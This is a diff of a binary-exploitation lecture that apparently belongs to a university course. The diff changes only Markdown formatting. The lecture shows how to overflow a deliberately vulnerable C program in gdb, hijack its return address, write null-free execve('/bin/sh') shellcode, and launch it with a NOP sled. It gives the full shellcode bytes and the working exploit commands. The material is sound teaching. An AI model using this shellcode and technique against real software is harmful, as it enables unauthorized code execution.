@@ -1,10 +1,8 @@
 # Unit 3: Stack Smashing Exploits
 
-Smashing the Stack for Fun and Profit
-=====================================
+# Smashing the Stack for Fun and Profit
 
-The setup
----------
+## The setup
 
 For this class we will use the following silly program to hone our
 skills at diagramming the stack and exploiting it:
@@ -48,7 +46,7 @@ int main(int argc, char *argv[]){
 When not being exploited, the program will simply print the string some
 number of times:
 
-``` {.example}
+``` example
 $ ./vulnerable 5 "Go Navy! Beat Army!"
 0 Go Navy! Beat Army!
 1 Go Navy! Beat Army!
@@ -62,20 +60,19 @@ function which performs no bounds checking on the length of str prior to
 copying into buf. We can easily crash the program with a buffer
 overflow:
 
-``` {.example}
+``` example
 $ ./vulnerable 5 `python -c 'print "A"*50'`
 Segmentation fault (core dumped)
 ```
 
-Inspecting the stack using gdb
-------------------------------
+## Inspecting the stack using gdb
 
 To make use of the programming bug, we first better understand the
 extent of the bug by inspecting the stack layout. Let's go about doing
 this in GDB by checking out the registers for the base and stack
 pointer:
 
-``` {.example}
+``` example
 $ gdb -q ./vulnerable 
 Reading symbols from ./vulnerable...done.
 (gdb) br vuln
@@ -120,7 +117,7 @@ The easiest one to identify is the variable `i` is at `ebp-0xc` because
 the instruction at `vuln+6` we initialize to zero. We can quickly verify
 this in gdb by running the instruction and checkin the value of `i`.
 
-``` {.example}
+``` example
 (gdb) p i
 $1 = -1209742720
 (gdb) ni
@@ -165,7 +162,7 @@ to `esp`, thus must be `buf` and `ebp+0xc` is written to `esp+0x4` and
 must be `str`. We can further verify this with gdb by examining the
 memory:
 
-``` {.example}
+``` example
 (gdb) x/wx $ebp+0xc 
 0xbffff674: 0xbffff895
 (gdb) x/s 0xbffff895
@@ -175,7 +172,7 @@ memory:
 If we continue after the call, we'll see that now the same string has
 been written to the address starting with `ebp-0x2c`:
 
-``` {.example}
+``` example
 (gdb) ni 5
 21   while( i < n ){
 (gdb) ds
@@ -214,7 +211,7 @@ We now know the location of all the variables, and so we pretty much
 have everything we need to diagram the entire stack layout. All that's
 left is to just print out the base and stack pointer:
 
-``` {.example}
+``` example
 (gdb) i r esp ebp
 esp            0xbffff620 0xbffff620
 ebp            0xbffff668 0xbffff668
@@ -224,8 +221,7 @@ With a little more work, we get a diagram like:
 
 [![](imgs/stack_diagram_vuln.png)](imgs/stack_diagram_vuln.png)
 
-Overwriting Stack Variables
----------------------------
+## Overwriting Stack Variables
 
 The first part of smashing the stack will be to change the control flow
 of the program with respect to stack variables. Our first target is the
@@ -235,7 +231,7 @@ loop loops less.
 First lets setup the input in such a way so that we fill up the whole
 buffer right up to the 32 byte boundary:
 
-``` {.example}
+``` example
 (gdb) delete
 Delete all breakpoints? (y or n) y
 (gdb) run 5 `python -c "print 'A'*32"`
@@ -251,7 +247,7 @@ Note that in gdb we can use backticks (\`) like in the shell to do
 computations. I am using python to generate 32 A's. You can see this by
 running the same python command in the terminal:
 
-``` {.example}
+``` example
 user@si485H-base:2.3$ python -c "print 'A'*32"
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
@@ -262,7 +258,7 @@ Anyway, back to the gbd terminal, if we fill the buffer with 32 bytes,
 things are ok, and the behavior is normal. Let's see what happens if we
 write 33 A's.
 
-``` {.example}
+``` example
 (gdb) run 5 `python -c "print 'A'*33"`
 Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 5 `python -c "print 'A'*33"`
 [Inferior 1 (process 5918) exited normally]
@@ -272,7 +268,7 @@ Nothing happens! We get no prints. That's because we now wrote the ASCII
 value of 'A' to i, which is 65 and greater than 5. But we can change the
 command line argument and you'll start to see something happen:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*33"`
 Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*33"`
 65 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
@@ -287,7 +283,7 @@ in ASCII 66 is B.
 We can continue this little experiment further ... keep smashing that
 stack.
 
-``` {.example}
+``` example
 gdb) run 66 `python -c "print 'A'*34"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -339,7 +335,7 @@ base pointer, and the stacks can no longer be realigned and thus we
 cannot reset the stack frame on return. We can also see how we've
 altered the base pointer using GDB:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*44"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -382,8 +378,7 @@ crashes as a result.
 We're just getting started here --- what if we kept going and overwrote
 the control flow? What if we overwrote the return address?
 
-Overwriting the Return Address
-------------------------------
+## Overwriting the Return Address
 
 If we return to our diagram of the memory layout, our goal now is to
 overwrite the return address of the vuln() function. The return address
@@ -393,7 +388,7 @@ following 4 bytes would be the return address. We can verify that in
 gdb. Remember, when we use 48 A's, there is actually one extra byte for
 the null terminator:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*48"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -492,7 +487,7 @@ In particular, let's get the program to run the function good() about
 return. The first thing we need to know in order to do that is the
 memory address of the instructions for good(). We can use gdb for that:
 
-``` {.example}
+``` example
 (gdb) ds good
 Dump of assembler code for function good:
    0x080484c1 <+0>: push   ebp
@@ -508,7 +503,7 @@ End of assembler dump.
 The address of the start of the function is 0x080484c1 so we need to
 write those bytes to the return address. Let's give it a shot:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*48+'\x08\x04\x84\xc1'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -521,7 +516,7 @@ Program received signal SIGSEGV, Segmentation fault.
 That didn't work, but we did crash the program. Let's see if we can
 figure out what happened:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*48+'\x08\x04\x84\xc1'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -563,7 +558,7 @@ Interesting. All the bytes are there, but they are in reverse! We forgot
 that x86 machines use Little Endian, which means that the most
 significant byte is in the right most position. Let's reverse the bytes:
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*48+'\xc1\x84\x04\x08'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -591,7 +586,7 @@ control can be properly returned. We can do that too, we just need to
 write one more address on the stack to where we want good() to return
 to. Because we're being bad, why not have it call bad()?
 
-``` {.example}
+``` example
 (gdb) ds bad
 Dump of assembler code for function bad:
    0x080484ad <+0>: push   ebp
@@ -619,7 +614,7 @@ Program received signal SIGSEGV, Segmentation fault.
 And finally, we can go a bit nuts and have multiple calls to good() and
 bad():
 
-``` {.example}
+``` example
 (gdb) run 66 `python -c "print 'A'*48+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'+'\x56\x85\x04\x08'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -644,11 +639,9 @@ Program received signal SIGSEGV, Segmentation fault.
 At this point, you should feel like the master of your computer. It's
 good to give a good hardy laugh: "Bwahaha!"
 
-Shell Code and System Calls in x86
-==================================
+# Shell Code and System Calls in x86
 
-What is "shell code"?
----------------------
+## What is "shell code"?
 
 The term shellcode refers to a small bit of binary code that can launch
 a shell (e.g., like a bash shell). Once you have a shell on a system,
@@ -671,8 +664,7 @@ Internet, here is the [Internet
 Archive](https://web.archive.org/web/20120710010645/http://badishi.com/basic-shellcode-example)
 of the original article.*
 
-Executing a Shell in C and in x86
----------------------------------
+## Executing a Shell in C and in x86
 
 Before we dive into the details of shellcode, let's discuss how we
 actually execute a shell in x86 which is just the execution of another
@@ -689,7 +681,6 @@ int main() {
     execve(args[0], args, NULL);
     return 0;
 }
-
 ```
 
 Recall back to systems programming, and you'll remember that a system
@@ -703,13 +694,13 @@ Let's take a look at how we get there in the dissembler. First, we need
 to make sure we compile our program using static reference so we can
 fully see how this works:
 
-``` {.example}
+``` example
 $ gcc -fno-stack-protector -z execstack -Wno-format-security -g -mpreferred-stack-boundary=2 --static    shell.c   -o shell
 ```
 
 Then we can use gdb to poke around:
 
-``` {.example}
+``` example
 (gdb) ds main
 Dump of assembler code for function main:
 0x0804887c <+0>:push   ebp
@@ -750,7 +741,7 @@ End of assembler dump.
 Now if we put all the instructions together that lead to the intrupt
 instruction `int` which invokes the operating system:
 
-``` {.example}
+``` example
 0x0806c821 <+1>:mov    edx,DWORD PTR [esp+0x10]                                                                                                                                                                       
 0x0806c825 <+5>:mov    ecx,DWORD PTR [esp+0xc]                                                                                                                                                                        
 0x0806c829 <+9>:mov    ebx,DWORD PTR [esp+0x8]                                                                                                                                                                        
@@ -769,7 +760,7 @@ offset from esp in main.
 To see why, let's trace the operations in main program beginning with
 some intialization.
 
-``` {.example}
+``` example
 0x0804887f <+3>:sub    esp,0x8
 0x08048882 <+6>:mov    DWORD PTR [ebp-0x8],0x80bb708
 0x08048889 <+13>:mov    DWORD PTR [ebp-0x4],0x0
@@ -779,7 +770,7 @@ First, we allocate 8 bytes on the stack from `ebp`, writing the number
 `0x80bb708` to `ebp-0x8` and `0x0` to `ebp-0x4`. Let's see what this
 looks like in a stack layout:
 
-``` {.example}
+``` example
   ebp+0xc   -> |    argv     |
   ebp+0x8   -> |    argc     |
   ebp+0x4   -> |  ret addr   |
@@ -792,7 +783,7 @@ looks like in a stack layout:
 What is the number 0x80bbb708? Well that is the address of the string
 containing `/bin/sh`.
 
-``` {.example}
+``` example
 gdb) x/s 0x80bb708
 0x80bb708:"/bin/sh"
 ```
@@ -810,7 +801,7 @@ null terminated, so `ebp-0x8` is the value of `args` in our program
 
 The next lines are the setup for our call to execve():
 
-``` {.example}
+``` example
 0x08048890 <+20>:mov    eax,DWORD PTR [ebp-0x8]
 0x08048893 <+23>:push   0x0
 0x08048895 <+25>:lea    edx,[ebp-0x8]
@@ -823,7 +814,7 @@ We've established that at address `ebp-0x8` we have the address of the
 the array. Following the operations above, we now have the following
 vision of the stack.
 
-``` {.example}
+``` example
   ebp+0xc   -> |    argv     |
   ebp+0x8   -> |    argc     |     0x080bb708 ---> "/bin/sh"
   ebp+0x4   -> |  ret addr   |     
@@ -849,7 +840,7 @@ the address of the string and null, and the third arugment is null (or
 0). Great! Now we make the call to execve and it's setup. Here's that
 code again prior to the interrupt.
 
-``` {.example}
+``` example
 0x0806c820 <+0>:push   ebx
 0x0806c821 <+1>:mov    edx,DWORD PTR [esp+0x10]
 0x0806c825 <+5>:mov    ecx,DWORD PTR [esp+0xc]
@@ -861,7 +852,7 @@ code again prior to the interrupt.
 We can continue to diagram the stack, but let's transform all of
 references with respect to `esp`.
 
-``` {.example}
+``` example
   esp+0x28  -> |    argv     |
   esp+0x24  -> |    argc     |     0x080bb708 ---> "/bin/sh"
   esp+0x20  -> |  ret addr   |     
@@ -898,7 +889,7 @@ table for other system calls. <http://asm.sourceforge.net/syscall.html>.
 You can also find all the system call numbers in the following include
 file:
 
-``` {.example}
+``` example
 /usr/include/i386-linux-gnu/asm/unistd_32.h 
 ```
 
@@ -928,11 +919,9 @@ only the pointer to the start of the /bin/sh string is passed, but that
 process is a discussion for a different class --- an operating systems
 class.
 
-Shell Code in x86
-=================
+# Shell Code in x86
 
-An x86 Programming
-------------------
+## An x86 Programming
 
 Now that we know what shell code looks like when we compile a program
 from C, our goal is to write our own program in x86 that will perform
@@ -941,8 +930,7 @@ NASM compiler and the gnu linker to build the executable, but we first
 need to get a grip on x86 programming generally. So we start with Hello
 World!
 
-Hello x86 programming
----------------------
+## Hello x86 programming
 
 We can write straight up assembly programs. Typically these files are
 described as ASM files, and have the `.asm` extension. Here's a hello
@@ -971,7 +959,6 @@ _start:
     mov ebx,0       ;exit value
     mov eax,1       ;exit systemcall number
     int 0x80        ;interupt
-
 ```
 
 First off, `main()` doesn't exist in assembly, it is a c-language
@@ -1014,8 +1001,7 @@ Lastly, we preform another system call at the end of the program to
 perform an exit. The system call number of `exit()` is 1 and the return
 value in `ebx` is 0, a successful exit.
 
-Compiling and Executing ASM program
------------------------------------
+## Compiling and Executing ASM program
 
 To compile our program we use nasm, the netwide assember. We wish to
 assemble our asm program into an elf object file. Next, we will link our
@@ -1024,7 +1010,7 @@ happens under the hood of gcc.
 
 To assemble using nasm
 
-``` {.example}
+``` example
   nasme -f elf helloworld.asm -o helloworld.o
 ```
 
@@ -1034,26 +1020,25 @@ semester.
 
 Next, we can link our object file with `ld` to produce the executable:
 
-``` {.example}
+``` example
   ld helloworld.o -o helloworld
 ```
 
 Then, we run our program:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ nasm -f elf helloworld.asm -o helloworld.o; ld helloworld.o -o helloworld
 user@si485H-base:demo$ ./helloworld 
 Hello, World!
 ```
 
-Write shell code in x86
------------------------
+## Write shell code in x86
 
 So we can print "Hello, World!", but the real goal is to launch a shell.
 Let's see if we can write a nasm program that can do that. First, let's
 recall how the stack looked just prior to the call to execve:
 
-``` {.example}
+``` example
   esp+0x28  -> |    argv     |
   esp+0x24  -> |    argc     |     0x080bb708 ---> "/bin/sh"
   esp+0x20  -> |  ret addr   |     
@@ -1112,7 +1097,7 @@ address in `esp` is the same as an `args` array in the C program. The
 remainder register setup is the same as before for a system call, and
 once we compile and run it, we get a shell.
 
-``` {.example}
+``` example
 aviv@si485h-base:~/git/class-demos/classes/09$ make
 nasm -g -f elf -o shell.o shell.asm
 ld  -o shell shell.o
@@ -1121,16 +1106,14 @@ $ echo "I have a shell"
 I have a shell
 ```
 
-Making Shell Code Exploit Ready
-===============================
+# Making Shell Code Exploit Ready
 
-Shell code as bytes
--------------------
+## Shell code as bytes
 
 The next thing we want to do is represent the program we wrote in raw
 bytes. To do that, let's look at the `objdump` output:
 
-``` {.example}
+``` example
 $ objdump -d -M intel shell
 
 shell:     file format elf32-i386
@@ -1156,7 +1139,7 @@ The byte valus for the instructions are clearly listed, but we want the
 bytes and just the bytes. Fortunately, `readelf` allows us to look at
 particular segments in binary.
 
-``` {.example}
+``` example
 $ readelf -x .text shell
 Hex dump of section '.text':
   0x08048080 6a0068a8 900408bb a8900408 89e1ba00 j.h.............
@@ -1168,7 +1151,7 @@ Tracing across the hex, we can see that indeed, those hex values are the
 same as objdump. Now, all we need to do parse that up. Which we can do
 with a series of grep, sed, cut, and tr comammands:
 
-``` {.example}
+``` example
 aviv@si485h-base:~/git/class-demos/classes/09$ readelf -x .text shell 
 
 Hex dump of section '.text':
@@ -1212,7 +1195,7 @@ $ readelf -x .text shell | grep "0x080" | tr -s " " | cut -d " " -f 3,4,5,6  | t
 
 Now we need to convert this into a hex string which we can use
 
-``` {.example}
+``` example
 $ bytes=$(readelf -x .text shell | grep "0x080" | tr -s " " | cut -d " " -f 3,4,5,6  | tr "\n" " " | sed "s/ //g" | sed "s/\.//g")
 $ echo $bytes
 6a0068a8900408bba890040889e1ba00000000b80b000000cd80bb00000000b801000000cd80
@@ -1223,7 +1206,7 @@ $ echo $bytes | python -c "import sys; hex=sys.stdin.read().strip(); print ''.jo
 I'm using a bit of python magic for this, but it works. Now, we could
 printf this string to see that we are indeed capturing the encoding:
 
-``` {.example}
+``` example
 $ echo $bytes | python -c "import sys; hex=sys.stdin.read().strip(); print ''.join('\\\\x%s%s'%(hex[i*2],hex[i*2+1]) for i in range(len(hex)/2))"
 \x6a\x00\x68\xa8\x90\x04\x08\xbb\xa8\x90\x04\x08\x89\xe1\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80
 $ hexbytes=$(echo $bytes | python -c "import sys; hex=sys.stdin.read().strip(); print ''.join('\\\\x%s%s'%(hex[i*2],hex[i*2+1]) for i in range(len(hex)/2))")
@@ -1241,25 +1224,24 @@ Finally, it makes sense to save this as a program so we can use it more
 often. I like to call that program `hexify` and it will quickly convert
 the text segement of a binary into a hex string.
 
-``` {.bash}
+``` bash
 #!/bin/bash
 
 bytes=$(readelf -x .text $1 | grep "0x080" | tr -s " " | cut -d " " -f 3,4,5,6  | tr "\n" " " | sed "s/ //g" | sed "s/\.//g")
 echo $bytes | python -c "import sys; hex=sys.stdin.read().strip(); print ''.join('\\\\x%s%s'%(hex[i*2],hex[i*2+1]) for i in range(len(hex)/2))"
 ```
 
-``` {.example}
+``` example
 $ ./hexify.sh shell
 \x6a\x00\x68\xa8\x90\x04\x08\xbb\xa8\x90\x04\x08\x89\xe1\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80
 ```
 
-Fixed references suck
----------------------
+## Fixed references suck
 
 The raw bytes we had above is shell code, but not quite. To test it out,
 we can try and execute in some c-code by casting it a function pointer.
 
-``` {#execve_fixedref.c .c}
+``` c
 int main(){
 
   char * code = "\x6a\x00\x68\xa8\x90\x04\x08\xbb\xa8\x90\x04\x08\x89\xe1\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80";
@@ -1273,7 +1255,7 @@ int main(){
 If we then go ahead and try and execute this program, it doesn't work as
 expected (or at all). To see why, we need to open it up in gdb:
 
-``` {.example}
+``` example
 (gdb) ds main
 Dump of assembler code for function main:
    0x080483ed <+0>: push   ebp
@@ -1304,7 +1286,7 @@ that address, we find our hello world program. But, there is a problem.
 We are pushing onto the stack the address 0x80490a8 which should be our
 "/bin/sh" string, but that reference is broken.
 
-``` {.example}
+``` example
 (gdb) x/s 0x80490a8
 0x80490a8:  <error: Cannot access memory at address 0x80490a8>
 ```
@@ -1312,14 +1294,13 @@ We are pushing onto the stack the address 0x80490a8 which should be our
 Our shell code doesn't work because we have fixed references, instead we
 need to do something different
 
-Jmp-Callback
-------------
+## Jmp-Callback
 
 To remove fixed references, we need to use instructions that will
 calculate a reference for us. There are a few ways to do this, but we
 will use the stand Jmp-Callback trick. Consider the reviced code below:
 
-``` {#execve_jmpcall .asm}
+``` asm
 SECTION .text       ; Code section
         global _start   ; Make label available to linker
 
@@ -1362,7 +1343,7 @@ the `esi` register.
 
 Now, we can hexify and insert that code into C and see if that works:
 
-``` {#execve_jmpcall.c .c}
+``` c
 int main(){
 
   char * code = "\x6a\x00\x68\xa8\x90\x04\x08\xba\x00\x00"
@@ -1377,7 +1358,7 @@ int main(){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gcc execve_jmpcall.c -o execve_jmpcall
 user@si485H-base:demo$ ./execve_jmpcall
 $ 
@@ -1385,14 +1366,13 @@ $
 
 And now we are in business ... sort of.
 
-Null Bytes are the ENEMY
-------------------------
+## Null Bytes are the ENEMY
 
 The next challenge is using our shell code through an exploit. We won't
 do that exactly, but we can simulate what that might be like with this
 simple program:
 
-``` {#dummy_exploit.c .c}
+``` c
 #include <string.h>
 
 int main(int argc, char *argv[]){
@@ -1414,7 +1394,7 @@ us.
 
 What we'd like to happen is that we can do this with our shell code hex:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hexify.sh execve_jmpcall
 \xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 user@si485H-base:demo$ ./dummy_exploit $(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
@@ -1424,7 +1404,7 @@ Segmentation fault (core dumped)
 We have a problem. Let's execute this under gdb, and we can see where
 the problem arises:
 
-``` {.example}
+``` example
 (gdb) ds main
 Dump of assembler code for function main:
    0x0804841d <+0>: push   ebp
@@ -1461,7 +1441,6 @@ Breakpoint 1, 0x0804844d in main ()
    0xbffff25e:  add    BYTE PTR [eax],al
    0xbffff260:  add    BYTE PTR [eax],al
    0xbffff262:  add    BYTE PTR [eax],al
-
 ```
 
 In the above gdb execution, first we set a break point right before the
@@ -1472,7 +1451,7 @@ a bunch of nonsense commands.
 
 What happened? Lets look more closely at our command line argument:
 
-``` {.example}
+``` example
 $(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
 ```
 
@@ -1481,14 +1460,13 @@ You see that 5 bytes in, there is a NULL (\\x00) which means the
 
 \*We need to remove NULL bytes!\*
 
-Removing NULL bytes
--------------------
+## Removing NULL bytes
 
 To remove NULL bytes, we need to get creative. Let's look at the objdump
 of our previous version of the shell code to get a sense of where we are
 at.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel execve_calljmp
 
 execve_calljmp:     file format elf32-i386
@@ -1571,7 +1549,7 @@ callback:
 
 And if we now look at the objdump, there is not a NULL to be found:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel execve_nonull
 
 execve_nonull:     file format elf32-i386
@@ -1608,18 +1586,16 @@ Disassembly of section .text:
 
 Finally, we can use our shell code in the dummy exploit with success:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hexify.sh execve_nonull
 \xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 user@si485H-base:demo$ ./dummy_exploit $(printf "\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
 $ 
 ```
 
-Stack Smashing with Shell Code
-==============================
+# Stack Smashing with Shell Code
 
-Failed Attempt 1
-----------------
+## Failed Attempt 1
 
 To make use of this exploit and have it execute our shell code, we need
 to overwrite the return address such that it jumps into our shell code.
@@ -1630,7 +1606,7 @@ In this attempt, we will send our shell code along with the exploit such
 that we will jump to the start of the `buf` in the code. It will look
 something like this:
 
-``` {.example}
+``` example
                    .-------------------------.
                    |                         |
                    v                         |
@@ -1644,7 +1620,7 @@ of the buffer.
 
 To get the length of our shell code, we can use `printf` and `wc`
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./hexify.sh ./execve_nonull 
 \xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
 user@si485H-base:demo$ printf "`./hexify.sh ./execve_nonull`" | wc -c
@@ -1654,7 +1630,7 @@ user@si485H-base:demo$ printf "`./hexify.sh ./execve_nonull`" | wc -c
 To make things easier, I'm going to save the bytes of the shell code to
 a file called `shell`.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf "`./hexify.sh ./execve_nonull`" > shell
 user@si485H-base:demo$ wc -c shell 
 37 shell
@@ -1664,7 +1640,7 @@ Next, I'm going to start up gdb to determine the address of `buf` using
 our expected exploit length. I'll just start with 0xdeadbeef as the
 address for a filler.
 
-``` {.example}
+``` example
 (gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xef\xbe\xad\xde'"`
 
 Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xef\xbe\xad\xde'"`
@@ -1703,7 +1679,7 @@ $1 = (void *) 0xbffff5fc
 So the address we need to overwrite is 0xbffff5fc instead of 0xdeadbeef.
 Let's give that a try:
 
-``` {.example}
+``` example
 gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xfc\xf5\xff\xbf'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -1720,7 +1696,7 @@ And, we FAIL! What happened?
 
 Let's do that again, and inspect the stack a bit more.
 
-``` {.example}
+``` example
 gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\x1c\xf6\xff\xbf'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -1763,7 +1739,7 @@ At this point, we are right after the call, so we can take a look around
 and we should see our shell code at the address `ebp-0x2c` and the
 return address.
 
-``` {.example}
+``` example
 (gdb) x/x $ebp+0x4
 0xbffff62c: 0xbffff5fc
 (gdb) x/16i 0xbffff5fc
@@ -1791,7 +1767,7 @@ Everything loks good so far. There is the shell code and in the right
 place. Looking closer, we should expect at 0xbfffff61a to be the string
 "/bin/sh" as this is jmp-callback. Let's take a look:
 
-``` {.example}
+``` example
 (gdb) x/s 0xbffff61a
 0xbffff61a: "/bin/sh", 'A' <repeats 11 times>, "\374\365\377\277"
 ```
@@ -1799,7 +1775,7 @@ place. Looking closer, we should expect at 0xbfffff61a to be the string
 Woops! We see our "/bin/sh" string but we also see a sh\*ton of A's
 following. That is to be expected given the way we set up our exploit:
 
-``` {.example}
+``` example
                    .-------------------------.
                    |                         |
                    v                         |
@@ -1810,13 +1786,12 @@ The padding occurs after our shell code, and now we are toast. We can't
 NULL terminate our shell-code because that means we won't pad out to the
 return address. We need to do something different.
 
-Failed Attempt 2
-----------------
+## Failed Attempt 2
 
 This time, we'll change strategies a bit. Instead of jumping backwards,
 let's jump forward. Here's what I propose:
 
-``` {.example}
+``` example
                                              .-----------.
                                              |           |
                                              |           v
@@ -1829,7 +1804,7 @@ right length and use 0xdeadbeef as the return address filler to
 calculate the start of the shell code which should be at `ebp+0x8`, four
 bytes further than the return address.
 
-``` {.example}
+``` example
 (gdb) p $ebp-0x2cQuit
 (gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xfc\xf5\xff\xbf'+sh"`
 The program being debugged has been started already.
@@ -1846,14 +1821,13 @@ Again, so the next address following the return address is 0xbfffff600.
 Um ... that is not going to work because that address has a NULL byte in
 it!
 
-SUCCESS!
---------
+## SUCCESS!
 
 Ok, so we need to jump 8 bytes further from the return address to skip
 of that null byte address. This time our shell code exploit looks like
 this:
 
-``` {.example}
+``` example
                                              .------------------------.
                                              |                        |
                                              |                        v
@@ -1863,7 +1837,7 @@ this:
 Again, I'll do an address calculation to see where we are. We know what
 that addres
 
-``` {.example}
+``` example
 (gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xef\xbe\xad\xde'+'A'*4+sh+'\x00'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -1881,7 +1855,7 @@ Breakpoint 1, 0x080484db in vuln ()
 
 We are looking to jump to the address 0xbffff604.
 
-``` {.example}
+``` example
 (gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4+sh+'\x00'"`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -1893,18 +1867,16 @@ Breakpoint 1, 0x080484db in vuln ()
 Continuing.
 process 7017 is executing new program: /bin/dash
 $ 
-
 ```
 
 Boom!
 
-Outside of GDB and NOP sledding
--------------------------------
+## Outside of GDB and NOP sledding
 
 The last step in this process is to get the exploit to work outside of
 gdb. If we just drop our exploit into the command line, it doesn't work:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4+sh+'\x00'"`
 Segmentation fault (core dumped)
 ```
@@ -1914,7 +1886,7 @@ addresses within gdb are *lower* than they would be outside gdb as they
 are more values on the stack. Visually we can see something like this
 for how our exploit works:
 
-``` {.example}
+``` example
 
     with gdb                 without gdb
 
@@ -1931,7 +1903,6 @@ for how our exploit works:
   | shell code | <-.                     <-'
   | padding    |   |                            
   | ret addr   |---'
-
 ```
 
 Without the gdb code, everything get's shifted up the stack, but the
@@ -1943,7 +1914,7 @@ around. A nop (read no-operation) is a special instruction that does
 nothing. The byte code for nop is 0x90. With nops Well shift the address
 space like so:
 
-``` {.example}
+``` example
 
     without nops           with nops         
 
@@ -1966,7 +1937,7 @@ The sequenences of nops form a "nop sled." If control jumps anywhere
 within the nop sled, we'll do a bunch of no operations until we reach
 the shell code. Our exploit will look like this:
 
-``` {.example}
+``` example
                                              .-----------------------.
                                              |                       | 
                                              |                       v
@@ -1975,7 +1946,7 @@ the shell code. Our exploit will look like this:
 
 How many nop's do we add? It doesn't matter, but we can try and see.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x10 + sh+'\x00'"`
 Segmentation fault (core dumped)
 user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x20 + sh+'\x00'"`
